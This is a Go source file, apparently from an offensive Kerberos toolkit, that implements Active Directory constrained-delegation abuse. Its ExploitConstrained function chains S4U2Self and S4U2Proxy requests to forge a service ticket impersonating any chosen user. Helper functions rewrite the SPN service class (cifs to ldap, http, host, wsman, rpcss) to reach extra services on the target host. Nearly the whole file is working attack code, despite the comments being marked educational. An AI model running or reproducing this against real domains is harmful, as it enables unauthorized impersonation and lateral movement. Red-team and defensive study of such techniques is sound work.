package delegation

import (
	"context"
	"fmt"

	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Constrained Delegation Abuse
//
// Constrained delegation lets a service impersonate users to specific targets.
// If we compromise a service with constrained delegation configured:
//
// 1. Check msDS-AllowedToDelegateTo for allowed target SPNs
// 2. Use S4U2Self to get ticket impersonating any user (to ourselves)
// 3. Use S4U2Proxy to exchange for ticket to allowed target as that user
//
// SPN Substitution Trick:
// The service class in the SPN doesn't matter for authorization!
// If allowed to cifs/server, you might access:
//   - ldap/server
//   - http/server
//   - host/server
// All resolve to the same machine and accept the ticket!

// ConstrainedDelegationRequest configures a constrained delegation attack.
type ConstrainedDelegationRequest struct {
	// Our compromised service account's TGT
	TGT        *ticket.Kirbi
	SessionKey []byte

	// Who to impersonate
	TargetUser   string
	TargetDomain string

	// Where to delegate to
	TargetSPN string // Must be in msDS-AllowedToDelegateTo (or use alt service)

	// Our service identity
	ServiceName string

	// Connection
	Domain string
	KDC    string
}

// ConstrainedDelegationResult contains the impersonation ticket.
type ConstrainedDelegationResult struct {
	// S4U2Self result (ticket to ourselves as target user)
	S4USelfTicket *ticket.Kirbi
	Forwardable   bool // Can we use for S4U2Proxy?

	// S4U2Proxy result (ticket to target as target user)
	S4UProxyTicket *ticket.Kirbi
	Base64         string
}

// ExploitConstrained performs a constrained delegation attack.
//
// EDUCATIONAL: Full Attack Flow
//
// Step 1: S4U2Self
//
//	Request: "Give me a ticket for TargetUser to access ME"
//	Result: Ticket that says TargetUser is accessing our service
//
// Step 2: S4U2Proxy
//
//	Request: "Using this evidence, give me ticket for TargetUser to TargetSPN"
//	Result: Ticket for TargetUser to access TargetSPN
//
// Step 3: Use the ticket
//
//	Present to target service - we're now TargetUser!
func ExploitConstrained(ctx context.Context, req *ConstrainedDelegationRequest) (*ConstrainedDelegationResult, error) {
	if req.TGT == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.TargetUser == "" {
		return nil, fmt.Errorf("target user is required")
	}
	if req.TargetSPN == "" {
		return nil, fmt.Errorf("target SPN is required")
	}

	result := &ConstrainedDelegationResult{}

	// Step 1: S4U2Self
	s4uSelfReq := &client.S4U2SelfRequest{
		TGT:          req.TGT,
		SessionKey:   req.SessionKey,
		TargetUser:   req.TargetUser,
		TargetDomain: req.TargetDomain,
		ServiceName:  req.ServiceName,
		Domain:       req.Domain,
		KDC:          req.KDC,
	}

	s4uSelfResult, err := client.S4U2SelfWithContext(ctx, s4uSelfReq)
	if err != nil {
		return nil, fmt.Errorf("S4U2Self failed: %w", err)
	}

	result.S4USelfTicket = s4uSelfResult.Kirbi
	result.Forwardable = s4uSelfResult.Forwardable

	if !s4uSelfResult.Forwardable {
		// Without TRUSTED_TO_AUTH_FOR_DELEGATION, we can't proceed to S4U2Proxy
		return result, fmt.Errorf("S4U2Self ticket not forwardable - constrained delegation requires protocol transition")
	}

	// Step 2: S4U2Proxy
	s4uProxyReq := &client.S4U2ProxyRequest{
		TGT:            req.TGT,
		SessionKey:     req.SessionKey,
		S4U2SelfTicket: s4uSelfResult.Kirbi,
		TargetSPN:      req.TargetSPN,
		Domain:         req.Domain,
		KDC:            req.KDC,
	}

	s4uProxyResult, err := client.S4U2ProxyWithContext(ctx, s4uProxyReq)
	if err != nil {
		return result, fmt.Errorf("S4U2Proxy failed: %w", err)
	}

	result.S4UProxyTicket = s4uProxyResult.Kirbi
	result.Base64 = s4uProxyResult.Base64

	return result, nil
}

// AlternateServiceClass substitutes the service class in an SPN.
//
// EDUCATIONAL: SPN Service Class Substitution
//
// Windows validates that the ticket's SPN matches the service,
// but only the HOST part matters for finding the right key!
//
// If msDS-AllowedToDelegateTo = "cifs/server.domain.com"
// We can substitute to get tickets for:
//   - ldap/server.domain.com (LDAP access)
//   - http/server.domain.com (WinRM/ADWS)
//   - host/server.domain.com (Generic)
//
// This expands attack surface significantly!
func AlternateServiceClass(spn, newServiceClass string) string {
	// SPN format: service/host or service/host:port
	for i, c := range spn {
		if c == '/' {
			return newServiceClass + spn[i:]
		}
	}
	return spn
}

// CommonAlternateServices returns common service class substitutions.
func CommonAlternateServices(baseSPN string) []string {
	classes := []string{
		"cifs",  // SMB
		"ldap",  // LDAP
		"http",  // WinRM, ADWS
		"host",  // Generic
		"wsman", // WS-Management
		"rpcss", // RPC
	}

	var alternatives []string
	for _, class := range classes {
		alternatives = append(alternatives, AlternateServiceClass(baseSPN, class))
	}
	return alternatives
}
